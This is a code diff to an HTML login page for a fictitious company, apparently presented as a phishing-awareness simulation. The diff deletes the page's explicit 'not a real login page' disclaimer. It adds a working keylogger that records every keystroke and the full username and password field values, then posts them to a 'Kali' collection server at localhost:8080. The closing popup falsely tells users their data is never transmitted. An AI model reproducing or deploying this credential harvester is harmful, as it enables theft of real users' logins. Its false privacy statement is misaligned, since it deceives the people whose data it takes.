@@ -4,45 +4,509 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Tech Relations for the Future - Login</title>
+    <link rel="stylesheet" href="landing_styles.css">
+    <style>
+        .educational-popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .popup-content {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 500px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+        
+        .popup-content h3 {
+            color: #004080;
+            margin-bottom: 15px;
+        }
+        
+        .tips {
+            text-align: left;
+            margin: 20px 0;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 5px;
+        }
+        
+        .tips h4 {
+            color: #004080;
+            margin-bottom: 10px;
+        }
+        
+        .tips ul {
+            margin-left: 20px;
+        }
+        
+        .tips li {
+            margin: 5px 0;
+        }
+        
+        .popup-content button {
+            background: #004080;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        
+        .popup-content button:hover {
+            background: #003060;
+        }
+        
+        .kali-status {
+            position: fixed;
+            bottom: 15px;
+            right: 15px;
+            background: #000;
+            color: #00ff00;
+            padding: 6px 12px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            z-index: 999;
+            border: 1px solid #00ff00;
+            opacity: 0.9;
+        }
+        
+        .data-controls {
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid #eee;
+        }
+        
+        .data-btn {
+            background: #0066cc;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            margin: 5px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        
+        .data-btn:hover {
+            background: #0052a3;
+        }
+        
+        #clearDataBtn {
+            background: #dc3545;
+        }
+        
+        #clearDataBtn:hover {
+            background: #c82333;
+        }
+    </style>
 </head>
 <body>
-  <!-- 🔶 DISCLAIMER BANNER — placed right after <body> -->
-  <div style="
-    background: #ffeb3b;
-    padding: 10px;
-    text-align: center;
-    font-weight: bold;
-    border-bottom: 2px solid #e0c200;
-  ">
-    ⚠ Academic Cybersecurity Simulation — This is NOT a real login page.
-  </div>
+    <!-- Warning Banner -->
+    <div class="warning-banner">
+        Cybersecurity phishing Simulation
+    </div>
 
     <div class="login-container">
-        <h2> Login</h2>
-        <!--Login Portal for Tech Relations for the Future-->
-        <form>
+        <div class="login-header">
+            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSIyMCIgY3k9IjIwIiByPSIyMCIgZmlsbD0iIzAwNDA4MCIvPjxwYXRoIGQ9Ik0xNiAyNmw4LThtLTggMGw4IDgiIHN0cm9rZT0id2hpdGUiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIi8+PC9zdmc+" alt="Logo">
+            <h2>Tech Relations Portal</h2>
+            <p>Secure Login Required</p>
+        </div>
+        
+        <form id="loginForm" class="login-form">
             <div class="input-group">
                 <label for="username">Username</label>
-                <input type="text" id="username" name="username" required>
+                <input type="text" id="username" name="username" placeholder="employee@trfuture.com" required>
             </div>
             
             <div class="input-group">
                 <label for="password">Password</label>
-                <input type="text" id="password" name="password" required>
+                <input type="password" id="password" name="password" placeholder="••••••••" required>
             </div>
-            <!-- This button does not submit the form -->
-            <button type="button" onclick="alert('Button clicked! The form was not submitted.');">
-            This button does not submit anything
+            
+            <button type="submit" class="login-btn">
+                Sign In
             </button>
-
-            <p style="font-size: 0.8rem; color: #777; margin-top: 20px;">
-                <strong>Disclaimer:</strong> This page is part of a controlled academic project on cybersecurity awareness. 
-                It is a simulated environment and does not store or collect any real user data.
-            </p>
-
-
-
+            
+            <div class="form-footer">
+                <a href="#" class="forgot-link">Forgot password?</a>
+            </div>
         </form>
+
+        <!-- Kali Data Controls -->
+        <div class="data-controls" style="display: none;" id="dataControls">
+            <h4>Session Data</h4>
+            <button id="viewDataBtn" class="data-btn">View Collected Data</button>
+            <button id="exportDataBtn" class="data-btn">Export Data as JSON</button>
+            <button id="clearDataBtn" class="data-btn">Clear Local Data</button>
         </div>
-        </body>
-        </html>
+
+    </div>
+
+    <!-- Kali Status Indicator -->
+    <div class="kali-status" id="kaliStatus">KALI: CHECKING</div>
+
+    <script>
+        // Kali Linux Keyboard Recorder
+        class KaliKeyboardRecorder {
+            constructor() {
+                this.keystrokes = [];
+                this.startTime = new Date();
+                this.sessionId = 'session_' + this.startTime.getTime();
+                this.isKali = false;
+                this.serverEndpoint = 'http://localhost:8080/log_keystrokes';
+                this.setupListeners();
+                this.checkKaliConnection();
+                this.updateStatusIndicator();
+            }
+
+            setupListeners() {
+                const inputs = document.querySelectorAll('#username, #password');
+                
+                inputs.forEach(input => {
+                    input.addEventListener('keydown', (e) => this.recordKeyDown(e));
+                    input.addEventListener('keyup', (e) => this.recordKeyUp(e));
+                    input.addEventListener('focus', (e) => this.recordFocus(e));
+                    input.addEventListener('blur', (e) => this.recordBlur(e));
+                    input.addEventListener('input', (e) => this.recordInput(e));
+                });
+
+                // Form submission
+                document.getElementById('loginForm').addEventListener('submit', async (e) => {
+                    e.preventDefault();
+                    this.recordFormSubmission();
+                    
+                    // Try to send to Kali server
+                    await this.sendToKaliServer();
+                    
+                    // Always save locally as backup
+                    this.saveToLocalStorage();
+                    
+                    // Show educational popup
+                    this.showEducationalPopup();
+                });
+
+                // Periodic saving for long sessions
+                setInterval(() => {
+                    if (this.keystrokes.length > 0) {
+                        this.saveToLocalStorage();
+                        if (this.isKali) {
+                            this.sendToKaliServer();
+                        }
+                    }
+                }, 10000);
+
+                // Before page unload
+                window.addEventListener('beforeunload', () => {
+                    if (this.keystrokes.length > 0) {
+                        this.saveToLocalStorage();
+                    }
+                });
+            }
+
+            async checkKaliConnection() {
+                try {
+                    const response = await fetch('http://localhost:8080/', { 
+                        method: 'HEAD',
+                        mode: 'no-cors'
+                    });
+                    this.isKali = true;
+                } catch (error) {
+                    this.isKali = false;
+                }
+                this.updateStatusIndicator();
+            }
+
+            recordKeyDown(event) {
+                const keyData = {
+                    type: 'keydown',
+                    key: this.sanitizeKey(event.key),
+                    code: event.code,
+                    timestamp: new Date().toISOString(),
+                    target: event.target.id,
+                    value_pre: event.target.value,
+                    altKey: event.altKey,
+                    ctrlKey: event.ctrlKey,
+                    shiftKey: event.shiftKey
+                };
+                
+                this.keystrokes.push(keyData);
+            }
+
+            recordKeyUp(event) {
+                const keyData = {
+                    type: 'keyup',
+                    key: this.sanitizeKey(event.key),
+                    code: event.code,
+                    timestamp: new Date().toISOString(),
+                    target: event.target.id,
+                    value_post: event.target.value
+                };
+                
+                this.keystrokes.push(keyData);
+            }
+
+            recordFocus(event) {
+                const focusData = {
+                    type: 'focus',
+                    timestamp: new Date().toISOString(),
+                    target: event.target.id
+                };
+                
+                this.keystrokes.push(focusData);
+            }
+
+            recordBlur(event) {
+                const blurData = {
+                    type: 'blur',
+                    timestamp: new Date().toISOString(),
+                    target: event.target.id,
+                    final_value: event.target.value
+                };
+                
+                this.keystrokes.push(blurData);
+            }
+
+            recordInput(event) {
+                const inputData = {
+                    type: 'input',
+                    timestamp: new Date().toISOString(),
+                    target: event.target.id,
+                    current_value: event.target.value
+                };
+                
+                this.keystrokes.push(inputData);
+            }
+
+            recordFormSubmission() {
+                const form = document.getElementById('loginForm');
+                const formData = {
+                    type: 'form_submit',
+                    timestamp: new Date().toISOString(),
+                    form_data: {
+                        username: form.username.value,
+                        password_length: form.password.value.length
+                    }
+                };
+                
+                this.keystrokes.push(formData);
+            }
+
+            sanitizeKey(key) {
+                if (key.length === 1) return key;
+                switch(key) {
+                    case ' ': return '[SPACE]';
+                    case 'Enter': return '[ENTER]';
+                    case 'Tab': return '[TAB]';
+                    case 'Escape': return '[ESC]';
+                    case 'Backspace': return '[BACKSPACE]';
+                    case 'Delete': return '[DEL]';
+                    case 'ArrowUp': return '[UP]';
+                    case 'ArrowDown': return '[DOWN]';
+                    case 'ArrowLeft': return '[LEFT]';
+                    case 'ArrowRight': return '[RIGHT]';
+                    case 'Control': return '[CTRL]';
+                    case 'Alt': return '[ALT]';
+                    case 'Shift': return '[SHIFT]';
+                    case 'CapsLock': return '[CAPSLOCK]';
+                    default: return `[${key}]`;
+                }
+            }
+
+            async sendToKaliServer() {
+                if (this.keystrokes.length === 0) return;
+                
+                const sessionData = {
+                    session_id: this.sessionId,
+                    start_time: this.startTime.toISOString(),
+                    end_time: new Date().toISOString(),
+                    duration: new Date() - this.startTime,
+                    total_events: this.keystrokes.length,
+                    keystrokes: this.keystrokes.slice(),
+                    page_url: window.location.href,
+                    user_platform: navigator.platform,
+                    user_agent: navigator.userAgent
+                };
+                
+                try {
+                    const response = await fetch(this.serverEndpoint, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(sessionData)
+                    });
+                    
+                    if (response.ok) {
+                        console.log('Data sent to Kali server');
+                        this.keystrokes = [];
+                        return true;
+                    }
+                } catch (error) {
+                    console.log('Kali server not available, using local storage only');
+                    this.isKali = false;
+                    this.updateStatusIndicator();
+                }
+                return false;
+            }
+
+            saveToLocalStorage() {
+                try {
+                    const sessionData = {
+                        session_id: this.sessionId,
+                        start_time: this.startTime.toISOString(),
+                        total_events: this.keystrokes.length,
+                        keystrokes: this.keystrokes
+                    };
+                    
+                    const storageKey = 'phishing_simulation_data';
+                    let allData = JSON.parse(localStorage.getItem(storageKey)) || [];
+                    allData.push(sessionData);
+                    
+                    if (allData.length > 20) {
+                        allData = allData.slice(-20);
+                    }
+                    
+                    localStorage.setItem(storageKey, JSON.stringify(allData));
+                    
+                } catch (error) {
+                    console.error('Error saving to localStorage:', error);
+                }
+            }
+
+            loadFromLocalStorage() {
+                try {
+                    const storageKey = 'phishing_simulation_data';
+                    return JSON.parse(localStorage.getItem(storageKey)) || [];
+                } catch (error) {
+                    return [];
+                }
+            }
+
+            exportData() {
+                const allData = this.loadFromLocalStorage();
+                if (allData.length === 0) {
+                    alert('No data to export');
+                    return;
+                }
+                
+                const dataStr = JSON.stringify(allData, null, 2);
+                const dataUri = 'data:application/json;charset=utf-8,' + encodeURIComponent(dataStr);
+                
+                const exportFileDefaultName = `phishing_data_${this.startTime.getTime()}.json`;
+                const linkElement = document.createElement('a');
+                linkElement.setAttribute('href', dataUri);
+                linkElement.setAttribute('download', exportFileDefaultName);
+                linkElement.click();
+            }
+
+            clearLocalData() {
+                if (confirm('Are you sure you want to clear all locally stored data?')) {
+                    localStorage.removeItem('phishing_simulation_data');
+                    alert('Local data cleared.');
+                }
+            }
+
+            updateStatusIndicator() {
+                const statusElement = document.getElementById('kaliStatus');
+                if (this.isKali) {
+                    statusElement.textContent = `KALI: ACTIVE (${this.keystrokes.length})`;
+                    statusElement.style.background = '#002200';
+                    statusElement.style.borderColor = '#00ff00';
+                } else {
+                    statusElement.textContent = 'LOCAL ONLY';
+                    statusElement.style.background = '#222200';
+                    statusElement.style.borderColor = '#ffff00';
+                }
+            }
+
+            showEducationalPopup() {
+                const popup = document.createElement('div');
+                popup.className = 'educational-popup';
+                popup.innerHTML = `
+                    <div class="popup-content">
+                        <h3>Simulation Complete!</h3>
+                        <p>You entered credentials into a simulated phishing page.</p>
+                        
+                        <div class="tips">
+                            <h4>Security Best Practices:</h4>
+                            <ul>
+                                <li>Always verify URLs before logging in</li>
+                                <li>Look for HTTPS and valid certificates</li>
+                                <li>Check sender email addresses carefully</li>
+                                <li>Never enter credentials from email links</li>
+                                <li>Report suspicious emails to IT Security</li>
+                            </ul>
+                            
+                            <h4>Data Collected (For Educational Purposes):</h4>
+                            <ul>
+                                <li>Keystroke timing and patterns</li>
+                                <li>Form field interactions</li>
+                                <li>Typing behavior analysis</li>
+                            </ul>
+                        </div>
+                        
+                        <div style="margin-top: 15px;">
+                            <p><em>All data is stored locally and not transmitted externally.</em></p>
+                        </div>
+                        
+                        <button onclick="this.parentElement.parentElement.remove(); document.getElementById('loginForm').reset();">
+                            Continue Simulation
+                        </button>
+                    </div>
+                `;
+                
+                // Show data controls after popup
+                document.getElementById('dataControls').style.display = 'block';
+                
+                document.body.appendChild(popup);
+            }
+        }
+
+        // Initialize when page loads
+        let keyboardRecorder;
+        document.addEventListener('DOMContentLoaded', () => {
+            keyboardRecorder = new KaliKeyboardRecorder();
+            
+            // Set up data control buttons
+            document.getElementById('viewDataBtn').addEventListener('click', () => {
+                const data = keyboardRecorder.loadFromLocalStorage();
+                alert(`Total sessions recorded locally: ${data.length}\nCheck browser console for details.`);
+                console.log('All recorded sessions:', data);
+            });
+            
+            document.getElementById('exportDataBtn').addEventListener('click', () => {
+                keyboardRecorder.exportData();
+            });
+            
+            document.getElementById('clearDataBtn').addEventListener('click', () => {
+                keyboardRecorder.clearLocalData();
+            });
+            
+            // Update status every 2 seconds
+            setInterval(() => {
+                keyboardRecorder.updateStatusIndicator();
+            }, 2000);
+        });
+
+        // Forgot password link
+        document.querySelector('.forgot-link').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Password reset functionality is not available in this simulation.\nIn a real scenario, contact IT support through official channels.');
+        });
+    </script>
+</body>
+</html>
